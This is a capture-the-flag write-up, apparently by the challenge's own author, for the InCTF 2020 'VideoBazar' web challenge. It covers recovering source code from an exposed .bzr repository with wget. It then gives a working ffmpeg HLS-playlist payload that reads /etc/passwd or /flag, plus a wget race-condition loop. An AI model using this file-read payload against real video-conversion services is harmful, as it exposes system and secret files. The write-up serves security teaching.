---
title: VideoBazar - InCTF Internationals 2020
date: 2020-08-26 10:54:45
author: Captain-Kay
author_url: https://twitter.com/Captainkay11
categories:
 - Web Exploitation
tags:
 - SSRF
 - bzr
 - ffmpeg
 - InCTFi
---

**tl;dr**

+ Part-1: .bzr file retrival using any tool
+ Part-1: exploiting ssrf via ffmpeg to read /flag file to a video and download it before it gets deleted

<!--more-->


**Challenge Author:** [Captain-Kay](https://twitter.com/Captainkay11)

**Source:** [here](VideoBazar.zip)

In this challenge the players are welcomed with a harmless looking index.php page
which has only 1 textbox and some text saying `ENTER THE SUPER SECRET KEY`
The First Step is to find the hidden `.bzr` (Use anything like dirb gobuster dirbuster) folder and a quick google will reveal to you that
.bzr is basically a open source version control system. Basically its somewhat the same as .git

After Finding .bzr the next step would be to retrive the source code. But i couldnt find any tools to do it so u might have to manually get it 

steps to follow to get source code
```
1. Install bzr on your system
2. mkdir inctf
3. cd inctf
4. bzr init
5. echo 'testcheck' >file
6. bzr add
7. brz commit
8. rm file
```
So Now you have a bzr repository with the .bzr directory
Next 
```
9. cd .bzr/branch
10. rm last-revision
11. wget http://35.211.92.233:8001/.bzr/branch/last-revision
```
Basically we are getting and replacing our `last-revision` with the one on the server
We follow the same steps for `dirstate` and `pack-names`
```
12. cd ../checkout
13. rm dirstate
14. wget http://35.211.92.233:8001/.bzr/checkout/dirstate
15. cd ../repository
16. rm pack-names
17. wget http://35.211.92.233:8001/.bzr/repository/pack-names
```
So now we have all the important files which point to the commit history
Next we do a bzr check
which will spit out all the  name of the missing files

then simply wget them to the approprite folder
```
cd .bzr/repository/indces/
wget http://35.211.92.233:8001/.bzr/repository/indices/f66475e1bc8c3b9c86e53a761cb536df.rix
wget http://35.211.92.233:8001/.bzr/repository/indices/86b254a3ef28b93ac82c43c31283f23b.rix
wget http://35.211.92.233:8001/.bzr/repository/indices/1035bef5d03b940a3385fccc0c082001.rix
wget http://35.211.92.233:8001/.bzr/repository/indices/f66475e1bc8c3b9c86e53a761cb536df.iix
wget http://35.211.92.233:8001/.bzr/repository/indices/86b254a3ef28b93ac82c43c31283f23b.iix
wget http://35.211.92.233:8001/.bzr/repository/indices/1035bef5d03b940a3385fccc0c082001.iix
wget http://35.211.92.233:8001/.bzr/repository/indices/f66475e1bc8c3b9c86e53a761cb536df.cix
wget http://35.211.92.233:8001/.bzr/repository/indices/86b254a3ef28b93ac82c43c31283f23b.cix
wget http://35.211.92.233:8001/.bzr/repository/indices/1035bef5d03b940a3385fccc0c082001.cix
wget http://35.211.92.233:8001/.bzr/repository/indices/f66475e1bc8c3b9c86e53a761cb536df.tix
wget http://35.211.92.233:8001/.bzr/repository/indices/86b254a3ef28b93ac82c43c31283f23b.tix
wget http://35.211.92.233:8001/.bzr/repository/indices/1035bef5d03b940a3385fccc0c082001.tix

cd ../packs
wget http://35.211.92.233:8001/.bzr/repository/packs/1035bef5d03b940a3385fccc0c082001.pack
wget http://35.211.92.233:8001/.bzr/repository/packs/86b254a3ef28b93ac82c43c31283f23b.pack
wget http://35.211.92.233:8001/.bzr/repository/packs/f66475e1bc8c3b9c86e53a761cb536df.pack
```

Then do 
`bzr status`
and `bzr revert`
And you will have the source files of the challenge

After Getting the source files you can get the 
{`SUPER SECRET PASSWORD`==>`THIS_IS_THE_NEW_WAY_TO_DO_STUFF`}

## Now To the Second Part of the challenge
In the source code we see its using ffmpeg to convert the videos,
and it has ALLOW-EXTENTIONS set to  all,
And if you research a bit more u will find that ffmpeg has the ability/bug that it converts txt files to video files too.
Now we need to know how HLS playlist is handled
```
1. When processing a playlist, ffmpeg links all the segment contents together and processes them as a separate file
2. Ffmpeg uses the first segment of playlist to determine the file type
3. Ffmpeg uses a special way to process files with. TXT suffix. It will try to print the contents of the file on the screen as a terminal
```
So basically 
```
EXTM3U
EXT-X-MEDIA-SEQUENCE:0
EXTINF:1.0
GOD.txt

EXTINF:1.0
file:///etc/passwd

EXT-X-ENDLIST
```
> Ffmpeg sees the `EXTM3U` tag in the GAB2 subtitle block, and confirms that the file type is HLS playlist.
> Now even though the file God.txt doesnt exist  name is enough for ffmpeg to detect the file type as TXT
>Ffmpeg links the contents of all segments of the playlist together, because only the file / etc / passwd actually exists, so the final content is the content of the / etc / passwd file
> Because the file type is TXT, ffmpeg draws a terminal to print the file.

Now file:// is blacklisted in the source code No problem
we can just direclty do `/etc/passwd`

So now we have file read on the system 
###  how do we retrive the file 
if you see there is a sleep statement before the deletion of the files
and the file names are always the same (md5 of the given filename)
So we can easily execute a race condition to download the file before it gets deleted

## FINAL PAYLOAD FOR SECOND PART
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/flag
#EXT-X-ENDLIST
```
>Paste into a file with .mp4 extention (any extention will do) 
>convert to something 
>Race to download the file and read the flag


and Race condition

```
while 1
do 
wget http://35.211.92.233:8001/upload/<FILE>.<EXTENTIOn>
done
```
HOPE YOU ENJOYED IT :)



## REFERENCES USE TO MAKE CHALLENGE

>https://ctftime.org/writeup/13380
>https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf
>https://developpaper.com/analysis-of-ffmpeg-arbitrary-file-reading-vulnerability/
